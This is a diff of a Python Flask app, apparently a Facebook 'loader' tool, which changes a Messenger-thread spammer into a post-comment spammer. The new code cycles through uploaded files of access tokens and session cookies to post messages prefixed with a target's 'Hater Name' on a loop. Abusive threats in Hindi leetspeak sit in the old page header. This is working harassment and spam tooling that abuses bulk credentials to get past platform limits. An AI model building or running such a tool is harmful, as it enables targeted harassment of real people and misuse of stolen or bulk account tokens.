@@ -1,10 +1,8 @@
-from flask import Flask, request
+from flask import Flask, request, render_template, redirect, url_for, make_response, jsonify
 import requests
-from time import sleep
 import time
-from datetime import datetime
+
 app = Flask(__name__)
-app.debug = True
 
 headers = {
     'Connection': 'keep-alive',
@@ -17,125 +15,216 @@ headers = {
     'referer': 'www.google.com'
 }
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+# Global variable to track comment sending status
+sending_comment = False
+stopped = False
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
-
-
-    return '''
-
-<!DOCTYPE html>
+@app.route('/')
+def index():
+    return '''<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Prince Onfire</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <html>
-    <head>
-        <style>
-        body {
-        background-image: url('https://picjj.com/images/2024/05/11/NTfMo.jpg');
-        background-size: cover;
-    }
-    body {
-      font-family: Arial, sans-serif;
-    }
-    
-    .container {
-      width: 300px;
-      margin: 0 auto;
-      margin-top: 100px;
-      border: 1px solid #ccc;
-      padding: 20px;
-    }
-    
-    .container label, .container input[type="text"], .container input[type="password"] {
-      display: black;
-      width: 100%;
-      margin-bottom: 10px;
-    }
-    
-    .container button {
-      width: 100%;
-      padding: 10px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POST SERVER WEB TO WEB</title>
+    <style>
+        .header {
+            display: flex;
+            align-items: center;
+        }
+        .header h1 {
+            margin: 0 20px;
+        }
+        .header img {
+            max-width: 100px; 
+            margin-right: 20px;
+        }
+        .random-img {
+            max-width: 300px;
+            margin: 10px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 5px;
+            margin-bottom: 10px;
+        }
+        .btn-submit {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        #status {
+            margin-top: 10px;
+            color: blue;
+        }
+    </style>
+    <script>
+        var stopped = false;
 
-    .container button:hover {
-      background-color: #55a049;
-    }
-  </style>
-    </head>
-    <body>
-  <header class="header mt-4">\
-    <h1 class="mb-3" style="color: red;"> (-PR1NC3 N0NST0P T4B1H1-)</h1>
-    <h1 class="mt-3" style="color: White;"> (-PRINC3 K3 AG41NST M44T D1KHN4 W4RN4 T7MH4R1 M4 CH0D D1 J4Y3G1-)</h1>
-    <h1 class="mt-3" style="color: cyan;"> (- ENJ0Y K4R0 K1S1 S3 SH4RE N4 K4RN4 -)
-  </header>
+        function stopProcess() {
+            stopped = true;
+            fetch('/stop', {method: 'POST'});
+            document.getElementById("status").innerText = "Process stopped.";
+        }
 
-  <div class="container">
+        function checkStatus() {
+            if (!stopped) {
+                fetch('/status')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.sending) {
+                            document.getElementById("status").innerText = "Sending comment...";
+                        } else {
+                            document.getElementById("status").innerText = "Failed to send comment.";
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error fetching status:', error);
+                    });
+                setTimeout(checkStatus, 3000); // Check status every 3 seconds
+            }
+        }
+
+        window.onload = function() {
+            checkStatus();
+        };
+    </script>
+</head>
+<body>
+    <header class="header mt-4">
+        <h1 class="mb-3" style="color: blue;">𝐎𝐖𝐍𝐄𝐑 𝐑𝐎𝐇𝐈𝐓𝐗𝐃𝐖</h1>
+        <h1 class="mt-3" style="color: red;"> (𝐃𝐀𝐑𝐊 𝐅𝐎𝐍𝐗𝐓𝐄𝐑)</h1>
+    </header>
+
+<div class="container">
     <form action="/" method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="accessToken">Enter Your Token:</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-      </div>
-      <div class="mb-3">
-        <label for="threadId">Enter Convo/Inbox ID:</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx">Enter Hater Name:</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile">Select Your Notepad File:</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-      </div>
-      <div class="mb-3">
-        <label for="time">Speed in Seconds:</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+        <div class="mb-3">
+            <label for="threadId">POST ID:</label>
+            <input type="text" class="form-control" id="threadId" name="threadId" required>
+        </div>
+        <div class="mb-3">
+            <label for="kidx">Enter Hater Name:</label>
+            <input type="text" class="form-control" id="kidx" name="kidx" required>
+        </div>
+        <div class="mb-3">
+            <label for="messagesFile">Select Your Np File:</label>
+            <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+            <label for="txtFile">Select Your Tokens File:</label>
+            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+            <label for="time">Speed in Seconds (minimum 60 second for better results):</label>
+            <input type="number" class="form-control" id="time" name="time" required>
+        </div>
+        <div class="mb-3">
+            <label for="cookieData">Enter Cookie Data (comma or newline separated) or Upload Cookie File:</label>
+            <textarea class="form-control" id="cookieData" name="cookieData"></textarea>
+            <input type="file" class="form-control" id="cookieFile" name="cookieFile">
+        </div>
+        <div class="mb-3">
+            <label for="appStatusFile">Select Your App Status File:</label>
+            <input type="file" class="form-control" id="appStatusFile" name="appStatusFile" accept=".txt" required>
+        </div>
+        <button type="button" onclick="stopProcess()" class="btn btn-danger btn-submit">Stop Process</button>
+        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
     </form>
-  </div>
-  <footer class="footer">
-    <p>&copy; Developed by Prince  2024. All Rights Reserved.</p>
-    <p>Convo/Inbox Loader Tool</p>
-    <p>Keep enjoying  <a href="https://github.com/zeeshanqureshi0</a></p>
-  </footer>
-</body>
-  </html>
-    '''
+    <div id="status"></div>
+</div>
 
+    <div class="random-images">
+        <!-- Add more random images and links here as needed -->
+    </div>
+</body>
+</html>'''
+
+@app.route('/status')
+def status():
+    global sending_comment
+    return jsonify({"sending": sending_comment})
+
+@app.route('/stop', methods=['POST'])
+def stop():
+    global stopped
+    stopped = True
+    return '', 204
+
+@app.route('/', methods=['POST'])
+def send_message():
+    global sending_comment, stopped
+    thread_id = request.form.get('threadId')
+    mn = request.form.get('kidx')
+    time_interval = int(request.form.get('time'))
+
+    txt_file = request.files['txtFile']
+    access_tokens = txt_file.read().decode().splitlines()
+
+    messages_file = request.files['messagesFile']
+    messages = messages_file.read().decode().splitlines()
+
+    app_status_file = request.files['appStatusFile']
+    app_statuses = app_status_file.read().decode().splitlines()
+
+    # Check if cookie data is manually entered
+    cookie_data = request.form.get('cookieData')
+    if cookie_data:
+        cookies = [cookie.strip() for cookie in cookie_data.split(',')]
+    else:
+        # If cookie data is not entered, check for uploaded cookie file
+        cookie_file = request.files['cookieFile']
+        cookies = cookie_file.read().decode().splitlines()
+
+    num_comments = len(messages)
+    max_tokens = len(access_tokens)
+    max_cookies = len(cookies)
+    max_statuses = len(app_statuses)
+
+    post_url = f'https://graph.facebook.com/v15.0/{thread_id}/comments'
+    haters_name = mn
+    speed = time_interval
+
+    sending_comment = True
+    stopped = False
+
+    while not stopped:
+        try:
+            for comment_index in range(num_comments):
+                if stopped:
+                    break
+
+                token_index = comment_index % max_tokens
+                cookie_index = comment_index % max_cookies
+                status_index = comment_index % max_statuses
+
+                access_token = access_tokens[token_index]
+                cookie = cookies[cookie_index]
+                app_status = app_statuses[status_index]
+
+                comment = messages[comment_index].strip()
+
+                parameters = {
+                    'access_token': access_token,
+                    'message': f"{haters_name} {comment}",
+                    'app_status': app_status
+                }
+
+                # Set the cookie header
+                headers['Cookie'] = cookie
+
+                response = requests.post(post_url, json=parameters, headers=headers)
+
+                time.sleep(speed)
+
+        except Exception as e:
+            sending_comment = False
+            print(f"Error: {e}")
+            break
+
+    sending_comment = False
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
     app.run(debug=True)
